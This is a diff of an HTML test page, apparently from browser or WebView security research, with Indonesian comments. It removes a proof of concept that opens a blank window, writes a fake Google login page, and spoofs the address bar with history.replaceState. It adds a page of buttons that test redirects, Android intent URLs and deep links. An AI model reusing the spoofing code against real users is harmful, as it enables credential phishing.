@@ -1,55 +1,81 @@
 <html>
 <head>
-<script>
-function f() {
-    w = window.open("about:blank", "_blank");
-    
-    // Tulis fake content dulu
-    w.document.write(`
-        <html>
-        <head><title>Google Account</title></head>
-        <body>
-            <div style="font-family: Arial, sans-serif; padding: 20px;">
-                <h1>Fake Google Login</h1>
-                <p>Address bar shows account.google.com but content is fake!</p>
-                <input type="email" placeholder="Email or phone">
-                <button>Next</button>
-            </div>
-            <script>
-                // Coba redirect tapi FAIL/BLOCKED
-                try {
-                    // Method 1: Redirect ke URL yang invalid
-                    window.location = "https://account.google.com#blocked-by-poc";
-                    
-                    // Method 2: Redirect yang diblock oleh CSP
-                    window.location.replace("javascript:alert('redirect blocked')");
-                    
-                    // Method 3: Manipulasi history untuk spoof URL
-                    history.replaceState(null, "Google Account", "https://account.google.com");
-                    
-                } catch(e) {
-                    // Redirect gagal, tetap di halaman fake
-                    console.log("Redirect failed as expected");
-                }
-                
-                // Block further redirect attempts
-                window.onbeforeunload = function() { 
-                    return "Redirect blocked by POC"; 
-                };
-            <\/script>
-        </body>
-        </html>
-    `);
-    w.document.close();
-}
-</script>
+    <title>WebView Redirect Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body>
-<center>
-    <a href="#" onclick="f()" style="padding: 10px 20px; background: #4285f4; color: white; text-decoration: none; border-radius: 4px;">
-        Click For POC (Failed Redirect)
-    </a>
-    <p><small>Redirect akan gagal, address bar tetap spoofed</small></p>
-</center>
+    <div style="padding: 20px; text-align: center;">
+        <h2>WebView External Redirect Test</h2>
+        <p>Click button below to test redirect behavior</p>
+        
+        <!-- Method 1: Direct redirect dengan target _blank -->
+        <button onclick="redirectToExternal()" style="padding: 15px 30px; font-size: 16px; margin: 10px;">
+            Redirect to Google (Direct)
+        </button>
+        
+        <!-- Method 2: Pakai window.open dengan URL complex -->
+        <button onclick="openComplexURL()" style="padding: 15px 30px; font-size: 16px; margin: 10px; background: #4285f4; color: white; border: none; border-radius: 5px;">
+            Open External App Link
+        </button>
+        
+        <!-- Method 3: Intent-based URL (Android) -->
+        <button onclick="openIntentURL()" style="padding: 15px 30px; font-size: 16px; margin: 10px; background: #34a853; color: white; border: none; border-radius: 5px;">
+            Open Intent URL (Android)
+        </button>
+        
+        <!-- Method 4: Deep link + fallback -->
+        <button onclick="openDeepLink()" style="padding: 15px 30px; font-size: 16px; margin: 10px; background: #ea4335; color: white; border: none; border-radius: 5px;">
+            Deep Link Test
+        </button>
+    </div>
+
+    <script>
+        // Method 1: Direct redirect ke external URL
+        function redirectToExternal() {
+            // Redirect ke URL legitimate yang mungkin tidak bisa dihandle webview
+            window.location.href = "https://accounts.google.com";
+            // Atau pakai:
+            // window.open("https://accounts.google.com", "_blank");
+        }
+        
+        // Method 2: URL dengan schema yang force external browser
+        function openComplexURL() {
+            // URL dengan parameter complex yang mungkin crash webview
+            const url = "https://accounts.google.com/signin/v2/identifier?service=mail&passive=true&rm=false&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin";
+            window.open(url, "_system"); // _system force external browser
+        }
+        
+        // Method 3: Intent URL (Android specific)
+        function openIntentURL() {
+            // Intent URL yang force external app
+            const intentUrl = "intent://accounts.google.com/#Intent;scheme=https;package=com.android.chrome;end";
+            window.location.href = intentUrl;
+            
+            // Fallback kalau intent gagal
+            setTimeout(() => {
+                window.location.href = "https://accounts.google.com";
+            }, 1000);
+        }
+        
+        // Method 4: Deep link dengan custom scheme
+        function openDeepLink() {
+            // Coba deep link ke app lain
+            window.location.href = "twitter://timeline";
+            
+            // Fallback ke browser external
+            setTimeout(() => {
+                window.location.href = "https://twitter.com";
+            }, 500);
+        }
+        
+        // Method 5: Multiple redirect layers
+        function forceExternalBrowser() {
+            // Redirect berantai yang mungkin bingungin webview
+            window.location.href = "https://google.com";
+            setTimeout(() => {
+                window.location.href = "https://accounts.google.com";
+            }, 100);
+        }
+    </script>
 </body>
 </html>
